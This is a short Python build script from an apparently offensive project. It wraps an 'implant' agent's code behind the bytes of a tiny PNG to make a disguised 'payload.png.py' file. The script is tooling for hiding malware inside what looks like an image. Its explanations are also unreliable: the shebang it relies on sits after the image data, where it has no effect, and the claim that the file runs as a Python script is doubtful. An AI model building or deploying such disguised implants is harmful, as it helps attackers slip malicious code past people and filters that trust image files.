import os

# --- Configuration ---
AGENT_LOADER_PATH = os.path.join("implant", "agent.py")
OUTPUT_PAYLOAD_PATH = "payload.png.py"

# --- PNG Data ---
# A valid, 1x1 transparent PNG file.
# This is the "benign" part of our polyglot.
PNG_HEADER = bytes([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
    0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4, 0x89, 0x00, 0x00, 0x00,
    0x0a, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00,
    0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00, 0x00, 0x00, 0x00, 0x49,
    0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
])

# --- Magic Marker ---
# A shebang is a good marker because it's ignored by the PNG parser,
# but the OS and our executor can use it to identify the script.
PYTHON_SHEBANG = b"#!/usr/bin/env python3\n"


def build_polyglot():
    """
    Creates a polyglot file that is both a valid PNG and a Python script.
    """
    print(f"[*] Reading agent loader from: {AGENT_LOADER_PATH}")
    try:
        with open(AGENT_LOADER_PATH, 'rb') as f:
            agent_code = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Agent loader not found at '{AGENT_LOADER_PATH}'.")
        print("[!] Please run this script from the project's root directory.")
        return

    print(f"[*] Building polyglot payload at: {OUTPUT_PAYLOAD_PATH}")
    with open(OUTPUT_PAYLOAD_PATH, 'wb') as f:
        # Write the PNG header first.
        f.write(PNG_HEADER)
        # Append the Python shebang and the agent code.
        f.write(b"\n")
        f.write(PYTHON_SHEBANG)
        f.write(agent_code)

    print("[+] Polyglot payload created successfully.")
    print(f"[+] To run, use an executor that can handle this format, or 'python3 {OUTPUT_PAYLOAD_PATH}'.")

if __name__ == "__main__":
    # Ensure we are in the 'crawler' directory context
    # This is a simple way to handle paths for this build script.
    if os.path.basename(os.getcwd()) != "crawler":
        # Check if we are in the root and 'crawler' subdir exists
        if os.path.isdir("crawler"):
            os.chdir("crawler")
        else:
            print("[!] Error: Please run this script from the project root directory or the 'crawler' directory.")
            exit(1)

    build_polyglot()
